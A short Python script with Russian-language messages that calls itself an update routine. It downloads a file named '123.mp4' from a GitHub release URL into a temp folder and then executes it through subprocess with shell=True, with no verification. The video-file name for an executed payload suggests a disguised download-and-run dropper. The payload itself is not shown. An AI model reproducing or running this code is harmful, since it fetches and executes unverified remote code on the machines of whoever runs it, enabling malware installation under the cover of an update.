import os
import requests
import subprocess

def download_file(url, save_path):
    try:
        response = requests.get(url)
        with open(save_path, 'wb') as f:
            f.write(response.content)
        print("Файл успешно скачан и сохранён в", save_path)
        return True
    except Exception as e:
        print("Ошибка при скачивании файла:", e)
        return False

def run_update_file(file_path):
    try:
        subprocess.call(file_path, shell=True)
        print("Файл обновления успешно запущен")
    except Exception as e:
        print("Ошибка при запуске файла обновления:", e)

if __name__ == "__main__":
    update_url = "https://github.com/kromskii2/Klajer/releases/download/check-the-update/123.mp4"
    temp_folder = "temp"
    update_file_name = "123.mp4"  # Имя скачиваемого файла обновления

    if not os.path.exists(temp_folder):
        os.makedirs(temp_folder)

    update_file_path = os.path.join(temp_folder, update_file_name)

    if download_file(update_url, update_file_path):
        run_update_file(update_file_path)
    else:
        print("Не удалось скачать файл обновления.")
